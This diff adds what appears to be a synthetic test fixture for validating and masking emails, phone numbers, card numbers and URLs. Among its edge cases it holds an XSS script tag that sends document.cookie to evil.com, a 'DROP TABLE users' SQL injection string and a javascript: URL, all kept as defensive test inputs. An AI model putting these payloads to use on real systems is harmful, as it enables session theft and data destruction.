@@ -1,0 +1,27 @@
+User Registration Log — Export batch #4471
+New signup: sarah.connor88@gmail.com, verified via mobile +1 (415) 555-0192.
+Backup contact: s.connor@alumni.alueducation.com
+Support ticket #88213 opened by james_oduya@yahoo.co.uk — phone: 254-722-000111 (invalid, missing digit)
+ALU staff contact: registrar@alueducation.com, escalation: si-support@si.alueducation.com
+Payment attempt failed for card ending in 4242 4242 4242 4242 (Visa test card, should be masked in output)
+Second attempt: 5500-0000-0000-0004 declined - insufficient funds
+Malformed card entry: 1234-56-78 (should be rejected, not a valid 16-digit pattern)
+Contact us at: https://www.aluglobal.com/support or http://alueducation.com/help?ref=123&lang=en
+Broken link attempt: javascript:alert('xss') <-- should NOT be treated as a valid URL
+Suspicious input: '; DROP TABLE users; -- 
+Another injection attempt: <script>fetch('http://evil.com/steal?data='+document.cookie)</script>
+Phone formats seen in the wild:
+  +250 788 123 456 (Rwanda, international format)
+  (022) 555-0134 
+  022.555.0199
+  0788123456
+  +1-800-555-0199 ext. 4021
+Emails with edge cases:
+  jane.doe+newsletter@company.co
+  broken@@email.com   <- malformed, double @
+  no-at-sign-email.com  <- missing @ entirely
+  student.name@alumni.aluEducation.com  <- mixed case, should still validate if case-insensitive
+  fake.mail@alueducation.con  <- typo TLD, should be rejected if strict
+Random noise from the raw API dump:
+  {"status": "ok", "timestamp": "2026-09-06T14:32:00Z", "retry": false}
+  <div class="user-card">John Doe - Premium Member</div>
